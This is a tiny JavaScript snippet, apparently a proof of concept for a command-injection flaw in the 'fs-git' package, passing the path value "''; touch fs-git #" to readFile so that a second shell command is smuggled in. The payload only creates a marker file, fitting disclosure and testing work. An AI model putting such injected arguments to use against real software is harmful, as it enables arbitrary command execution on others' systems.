const { FSGit } = require('fs-git');

try {
    FSGit.prototype.readFile("''; touch fs-git #", {});
} catch (err) {}
